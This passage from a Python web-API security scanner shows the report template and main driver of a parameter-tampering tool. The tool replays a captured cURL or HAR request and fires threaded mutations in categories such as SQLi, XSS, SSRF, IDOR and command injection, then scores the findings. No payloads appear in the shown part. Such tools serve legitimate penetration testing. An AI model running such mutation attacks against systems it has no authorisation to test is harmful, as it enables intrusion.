  .sub{{color:#6e7681;font-size:12px;font-family:'IBM Plex Mono',monospace;margin-bottom:18px}}
  .cards{{display:flex;gap:12px;margin-bottom:22px;flex-wrap:wrap}}
  .card{{background:#0d1117;border:1px solid #21262d;border-radius:10px;
         padding:14px 22px;text-align:center;min-width:110px;position:relative;overflow:hidden}}
  .card::before{{content:'';position:absolute;top:0;left:0;right:0;height:3px}}
  .card.tot::before{{background:#58a6ff}}.card.hi::before{{background:#da3633}}
  .card.med::before{{background:#d29922}}.card.ok::before{{background:#238636}}
  .card.mut::before{{background:#8957e5}}
  .card h3{{font-size:26px;font-weight:700;margin-bottom:2px}}
  .card p{{font-size:10px;color:#6e7681;text-transform:uppercase;letter-spacing:1px}}
  .card.tot h3{{color:#58a6ff}}.card.hi h3{{color:#da3633}}
  .card.med h3{{color:#d29922}}.card.ok h3{{color:#238636}}
  .card.mut h3{{color:#8957e5}}
  hr{{border:none;border-top:1px solid #21262d;margin:18px 0}}
  table tr:hover td{{background:#161b22!important}}
  td{{padding:7px 10px;border-bottom:1px solid #161b22;vertical-align:top}}
  pre{{margin:0}}
  .ignored-note{{background:#161b22;border:1px solid #30363d;border-radius:6px;
    padding:8px 14px;font-size:11px;font-family:'IBM Plex Mono',monospace;
    color:#8b949e;margin-bottom:16px}}
  .ignored-note b{{color:#f0883e}}
</style>
<script>
  function toggleDetail(id) {{
    var r = document.getElementById(id);
    r.style.display = r.style.display === 'none' ? 'table-row' : 'none';
  }}
</script>
</head><body><div class='wrap'>

<h1>🔥 Parameter Tampering Report — cURL Edition</h1>
<p class='sub'>Generated: {now_str}  |  39 Mutation Categories  |  SQLi · XSS · SSTI · SSRF · XXE · IDOR · CMDi · LDAP · GraphQL · Business Logic + More</p>

<div class='ignored-note'>
  ⛔ <b>Ignored Fields (never mutated):</b>
  modifiedTime &nbsp;|&nbsp; createdTime &nbsp;|&nbsp; creator &nbsp;|&nbsp;
  creatorId &nbsp;|&nbsp; lastModifier &nbsp;|&nbsp; lastModifierId
</div>

<div class='cards'>
  <div class='card tot'><h3>{summary["total_params"]}</h3><p>Params Tested</p></div>
  <div class='card mut'><h3>{summary["total_mutations"]}</h3><p>Mutations Run</p></div>
  <div class='card hi'><h3>{summary["high_risk"]}</h3><p>High Risk</p></div>
  <div class='card med'><h3>{summary["medium_risk"]}</h3><p>Medium Risk</p></div>
  <div class='card ok'><h3>{summary["no_issue"]}</h3><p>No Issue</p></div>
</div>

<hr>
{section("High Risk Findings", "🔴", high_f, "#da3633")}
{section("Medium Risk Findings", "🟠", med_f, "#d29922")}
{section("No Issue", "🟢", clean_f, "#238636")}

</div></body></html>"""

    with open(output_path, "w", encoding="utf-8") as fh:
        fh.write(html)
    print(f"[OK] HTML report → {output_path}")


# ---------------------------------------------------------------------------
#  MAIN
# ---------------------------------------------------------------------------

DEFAULT_TIMEOUT  = 10    # seconds per request
DEFAULT_THREADS  = 5     # concurrent threads
DEFAULT_INSECURE = True  # skip SSL verification
CURL_FILE        = "cURL.txt"   # default cURL file — same directory as script


def _extract_token_from_entry(entry):
    """Pull the Authorization header value out of a parsed CURLEntry."""
    for k, v in entry.headers.items():
        if k.lower() == "authorization":
            return v.strip()
    return ""


def _print_banner():
    print(r"""
 ____                        _____
|  _ \ __ _ _ __ __ _ _ __ |_   _|__ _ __ ___  _ __   ___ _ __
| |_) / _` | '__/ _` | '_ \  | |/ _ \ '_ ` _ \| '_ \ / _ \ '__|
|  __/ (_| | | | (_| | | | | | |  __/ | | | | | |_) |  __/ |
|_|   \__,_|_|  \__,_|_| |_| |_|\___|_| |_| |_| .__/ \___|_|
  cURL Edition  ·  39 Mutation Categories  ·  Interactive
  IDOR | Business Logic | SQLi | XSS | SSTI | SSRF | Path Traversal
""")


def main():
    import argparse, socket, base64, time as _time

    _print_banner()

    parser = argparse.ArgumentParser(
        description="Parameter Tampering Tool — cURL Edition",
        usage="python Parameter_Tem.py",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Steps:\n"
            "  1. Put your cURL command in cURL.txt (include the Authorization header)\n"
            "  2. Run:  python Parameter_Tem.py\n"
            "  3. Follow the interactive steps\n"
            "\n"
            "Optional flags:\n"
            "  --file path/to/other.txt   Use a different file instead of cURL.txt\n"
            "  --threads N                Concurrent threads (default: 5)\n"
            "  --timeout N                Request timeout seconds (default: 10)\n"
            "  --delay N                  Sleep N seconds between requests (default: 0)\n"
            "  --verbose                  Print every mutation result\n"
            "  --output prefix            Report file prefix\n"
        ),
    )
    parser.add_argument("--file",    default=CURL_FILE,
                        help=f"cURL file path (default: {CURL_FILE})")
    parser.add_argument("--threads", type=int,   default=DEFAULT_THREADS)
    parser.add_argument("--timeout", type=int,   default=DEFAULT_TIMEOUT)
    parser.add_argument("--delay",   type=float, default=0.0,
                        help="Delay in seconds between each request (rate-limit protection, default: 0)")
    parser.add_argument("--verbose", "-v", action="store_true")
    parser.add_argument("--output",  "-o", default="")
    parser.add_argument("--mode", choices=["auto", "manual"], default="manual",
                        help="auto: no prompts, context-aware mutations; manual: interactive (default)")
    parser.add_argument("--har", default="",
                        help="Path to HAR file — scan all captured requests")
    parser.add_argument("--multi", action="store_true",
                        help="Treat --file as multi-cURL file (blocks separated by ---)")
    parser.add_argument("--csrf-url", default="",
                        help="URL to fetch fresh CSRF/session token before requests")
    parser.add_argument("--csrf-method", default="GET",
                        help="HTTP method for CSRF token fetch (default: GET)")
    parser.add_argument("--csrf-extract-json", default="",
                        help="JSON path to token, e.g. data.csrfToken")
    parser.add_argument("--csrf-extract-regex", default="",
                        help="Regex with capture group to extract token, e.g. csrf_token=([^&]+)")
    parser.add_argument("--csrf-header", default="",
                        help="Header name to inject CSRF token into, e.g. X-CSRF-Token")
    parser.add_argument("--csrf-body-field", default="",
                        help="Body field to inject CSRF token into")
    parser.add_argument("--csrf-refresh", type=int, default=0,
                        help="Re-fetch CSRF token every N requests (0=every request, default:0)")
    args = parser.parse_args()

    SEP  = "=" * 62
    SEP2 = "─" * 62

    print(SEP)
    print("  Parameter Tampering Tester — cURL Edition")
    print("  39 Mutation Categories | SQLi · XSS · SSTI · SSRF · XXE · IDOR · CMDi · LDAP · GraphQL · ReDoS")
    print(SEP2)

    # ── Load entries (single cURL / multi-cURL / HAR) ─────────────────────
    entries = []
    if args.har:
        print(f"\n  📄 Reading HAR: {args.har}")
        try:
            entries = parse_har_file(args.har)
            print(f"  Found {len(entries)} requests in HAR")
        except FileNotFoundError:
            print(f"\n  ❌  HAR file not found: {args.har}\n"); sys.exit(1)
        except Exception as e:
            print(f"\n  ❌  HAR parse error: {e}\n"); sys.exit(1)
    elif args.multi:
        print(f"\n  📄 Reading multi-cURL: {args.file}")
        try:
            entries = parse_multi_curl_file(args.file)
            print(f"  Found {len(entries)} cURL blocks")
        except FileNotFoundError:
            print(f"\n  ❌  File not found: {args.file}\n"); sys.exit(1)
    else:
        print(f"\n  📄 Reading: {args.file}")
        try:
            entries = [parse_curl_file(args.file)]
        except FileNotFoundError:
            print(f"\n  ❌  File not found: {args.file}")
            print(f"  → Create cURL.txt in the same folder and paste your cURL command.\n")
            sys.exit(1)
        except ValueError as e:
            print(f"\n  ❌  Parse error: {e}\n"); sys.exit(1)

    if not entries:
        print("\n  ❌  No valid requests found.\n"); sys.exit(1)

    # ── CSRF Refresher setup ──────────────────────────────────────────────
    csrf_refresher = None
    if args.csrf_url:
        print(f"\n  🔑 CSRF auto-refresh enabled → {args.csrf_url}")
        # Pass Authorization header from first entry so token fetch is authenticated
        base_hdrs = {}
        if entries:
            for k, v in entries[0].headers.items():
                if k.lower() in ("authorization", "cookie"):
                    base_hdrs[k] = v
        csrf_refresher = CsrfRefresher(
            url=args.csrf_url,
            method=args.csrf_method,
            extract_json=args.csrf_extract_json,
            extract_re=args.csrf_extract_regex,
            inject_header=args.csrf_header,
            inject_body_field=args.csrf_body_field,
            interval=args.csrf_refresh,
            base_headers=base_hdrs,
        )
        test_tok = csrf_refresher.get_token()
        if test_tok:
            print(f"  [✓] Token fetched: {test_tok[:40]}...")
        else:
            print(f"  [✗] Token fetch failed — check --csrf-url and extraction pattern")

    # ── Determine output filenames ─────────────────────────────────────────
    stem = Path(args.file if not args.har else args.har).stem
    ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
    base_out  = args.output.rstrip(".csv").rstrip(".html") if args.output else f"{stem}_tamper_{ts}"
    csv_path  = base_out + ".csv"
    html_path = base_out + ".html"

    print(SEP2)
    print(f"  📊 CSV  → {csv_path}")
    print(f"  🌐 HTML → {html_path}")
    print(f"  🎯 Mode : {args.mode.upper()}")
    print(f"  ⏱  Timeout: {args.timeout}s  |  🧵 Threads: {args.threads}  |  💤 Delay: {args.delay}s")
    print(SEP2)

    all_findings    = []
    total_params_sum = 0
    total_tasks_sum  = 0
    manual_categories = None  # set per-endpoint in manual mode

    for ep_idx, entry in enumerate(entries, 1):
        if len(entries) > 1:
            print(f"\n  ── Endpoint {ep_idx}/{len(entries)}: {entry.method} {entry.url[:80]}")

        # Token
        token = _extract_token_from_entry(entry)
        if not token:
            if len(entries) == 1:
                print("\n  ❌  Authorization header not found in cURL.txt")
                print("  → Add:  -H 'Authorization: Bearer eyJ...'")
                sys.exit(1)
            else:
                print(f"  [!] No auth token — skipping endpoint {ep_idx}")
                continue

        # JWT expiry check
        if token.lower().startswith("bearer "):
            jwt_raw = token.split(" ", 1)[1].strip()
            try:
                payload_seg = jwt_raw.split(".")[1]
                payload_seg += "=" * (-len(payload_seg) % 4)
                claims = json.loads(base64.urlsafe_b64decode(payload_seg))
                exp = claims.get("exp")
                if exp:
                    now_ts = int(_time.time())
                    from datetime import timezone as _tz, timedelta as _td
                    IST     = _tz(_td(hours=5, minutes=30))
                    exp_str = datetime.fromtimestamp(exp, tz=IST).strftime("%Y-%m-%d %H:%M:%S IST")
                    if now_ts > exp:
                        print(f"\n  ❌  JWT EXPIRED at {exp_str} — update token and retry.\n")
                        if len(entries) == 1:
                            sys.exit(1)
                        else:
                            print(f"  [!] Skipping expired-token endpoint {ep_idx}")
                            continue
                    else:
                        print(f"  JWT valid : until {exp_str}")
            except Exception:
                pass

        # Discover params
        all_params = entry.all_params()
        if not all_params:
            print(f"  [!] No testable params — skipping endpoint {ep_idx}")
            continue

        print(f"  Method    : {entry.method}")
        print(f"  URL       : {entry.url}")
        print(f"  Body type : {entry.body_type or 'none'}")
        print(f"  Params    : {len(all_params)} found")
        print(f"  Token     : {token[:30]}...")

        # ── AUTO mode: no prompts, context-aware ─────────────────────────────
        if args.mode == "auto":
            selected_params = [(s, p) for s, p, _ in all_params]
            random_formats  = {}
            context_aware   = True
        else:
            # MANUAL mode: interactive
            index = _print_params_table(all_params)
            selected_params = _ask_tamper_selection(index)
            print("  [*] Tamper targets: " +
                  ", ".join(f"{s}:{p}" for s, p in selected_params))
            manual_categories = _ask_category_selection()
            random_formats    = _ask_random_formats(index, selected_params)
            context_aware     = False

        # ── Connectivity check ────────────────────────────────────────────────
        parsed_url = urlparse(entry.url)
        host = parsed_url.hostname
        port = parsed_url.port or (443 if parsed_url.scheme == "https" else 80)
        try:
            socket.setdefaulttimeout(5)
            socket.create_connection((host, port))
            print(f"  [✓] Host reachable: {host}:{port}")
        except Exception:
            print(f"  [✗] Cannot reach {host}:{port} — skipping")
            continue

        # ── Baseline ─────────────────────────────────────────────────────────
        print("  [*] Baseline request firing...")
        session  = build_session(not DEFAULT_INSECURE)
        bl_entry = apply_random_formats(deepcopy(entry), random_formats)
        if csrf_refresher:
            bl_entry = csrf_refresher.apply(bl_entry)
        try:
            bl = requests.request(
                entry.method, bl_entry.url,
                headers={**bl_entry.headers, "Authorization": token},
                json=bl_entry.body if bl_entry.body_type == "json" else None,
                data=bl_entry.body if bl_entry.body_type == "form" else None,
                timeout=args.timeout, verify=not DEFAULT_INSECURE,
            )
            b_status = bl.status_code
            b_len    = len(bl.content)
            print(f"  [*] Baseline: status={b_status}  len={b_len} bytes")
            if b_status == 401:
                print(f"\n  ❌  401 — Token expired."); continue
            elif b_status == 403:
                print(f"  ⚠  403 FORBIDDEN — continuing (privilege escalation checks will run).")
            elif b_status == 422:
                print(f"  ⚠  422 — Configure unique fields if needed.")
            elif b_status >= 500:
                print(f"  ⚠  {b_status} server error on baseline.")
            else:
                print()
        except Exception as e:
            print(f"\n  ❌  Baseline fail: {e} — skipping\n"); continue

        # ── Build + run tasks ─────────────────────────────────────────────────
        print("  🧬 Building mutations...")
        _cat_override = manual_categories if args.mode == "manual" else None
        tasks, total_params = generate_tasks(
            session, token, args.timeout, args.verbose, args.delay, entry,
            selected_params=selected_params,
            random_formats=random_formats,
            context_aware=context_aware,
            csrf_refresher=csrf_refresher,
            category_override=_cat_override,
        )
        total_params_sum += total_params
        total_tasks_sum  += len(tasks)
        print(f"  Params tampered : {total_params}  |  Mutations : {len(tasks)}")
        if not tasks:
            print("  ℹ️  No mutations generated — skipping\n"); continue

        print(f"  🔬 Running {len(tasks)} mutations ({args.threads} threads)...")
        print(f"  {SEP2}")

        findings, completed = [], 0
        last_status = "-"
        total_t = len(tasks)

        with ThreadPoolExecutor(max_workers=args.threads) as ex:
            futures = {ex.submit(run_test, t): t for t in tasks}
            for future in as_completed(futures):
                completed += 1
                try:
                    result = future.result()
                    findings.append(result)
                    last_status = result["mut_status"]
                    if result["risk_level"] in ("High Risk", "Medium Risk") or args.verbose:
                        conf_icon = {
                            "Confirmed": "⚡", "Likely": "🔴",
                            "Possible":  "🟠", "No Issue": "🟢",
                        }.get(result.get("confidence", ""), "⚪")
                        ev_short = (result.get("evidence") or "")[:60]
                        print(f"\r  {conf_icon} [{result.get('confidence','?'):9}|{result['risk_level']:11}] "
                              f"{result['param_name']} | {result['mutation_type']} | "
                              f"{result['orig_status']}→{result['mut_status']}  {ev_short}     ")
                except Exception as e:
                    if args.verbose:
                        print(f"  [!] Task error: {e}")

                if total_t > 0:
                    pct    = completed / total_t * 100
                    filled = int(pct / 2)
                    bar    = "█" * filled + "░" * (50 - filled)
                    print(f"\r  [{bar}] {pct:5.1f}%  {completed}/{total_t}  last={last_status}  ",
                          end="", flush=True)

        print(f"\r  [{'█' * 50}] 100.0%  {completed}/{total_t}   ")
        all_findings.extend(findings)

    # ── Global false-positive suppression ────────────────────────────────────
    print("  🧹 Running FP suppressor...")
    all_findings = suppress_global_fp(all_findings)

    # ── Results summary ───────────────────────────────────────────────────────
    high   = sum(1 for f in all_findings if f["risk_level"] == "High Risk")
    medium = sum(1 for f in all_findings if f["risk_level"] == "Medium Risk")
    no_iss = sum(1 for f in all_findings if f["risk_level"] == "No Issue")

    conf_breakdown = {
        "Confirmed": sum(1 for f in all_findings if f.get("confidence") == "Confirmed"),
        "Likely":    sum(1 for f in all_findings if f.get("confidence") == "Likely"),
        "Possible":  sum(1 for f in all_findings if f.get("confidence") == "Possible"),
    }

    all_findings.sort(key=lambda x: (
        {"High Risk": 0, "Medium Risk": 1, "No Issue": 2}.get(x["risk_level"], 3),
        {"Confirmed": 0, "Likely": 1, "Possible": 2, "No Issue": 3}.get(
            x.get("confidence", "No Issue"), 3),
    ))

    summary = {
        "total_params":    total_params_sum,
        "total_mutations": total_tasks_sum,
        "high_risk":       high,
        "medium_risk":     medium,
        "no_issue":        no_iss,
    }

    health_pct = max(0, int(100 - (high * 20 + medium * 5)))
    bar_filled = health_pct // 4
    health_bar = "#" * bar_filled + " " * (25 - bar_filled)

    print()
    print(SEP)
    print("  📊 Audit Summary")
    print(SEP2)
    print(f"  Parameters Tampered      {total_params_sum}")
    print(f"  Mutations Executed       {total_tasks_sum}")
    print(SEP2)
    print(f"  🔴 High Risk             {high}")
    print(f"  🟠 Medium Risk           {medium}")
    print(f"  🟢 No Issue              {no_iss}")
    print(SEP2)
    print(f"  ⚡ Confirmed             {conf_breakdown['Confirmed']}")
    print(f"  🔴 Likely                {conf_breakdown['Likely']}")
    print(f"  🟠 Possible              {conf_breakdown['Possible']}")
    print(SEP2)
    print(f"  API Health Score : [{health_bar}]  {health_pct}%")
    print(SEP)

    # ── Reports ───────────────────────────────────────────────────────────────
    print()
    write_csv(csv_path, all_findings)
    generate_html(all_findings, summary, html_path)
    print()
    print(f"  📊 CSV  report → {csv_path}")
    print(f"  🌐 HTML report → {html_path}")
    print(SEP)
    print()


if __name__ == "__main__":
    main()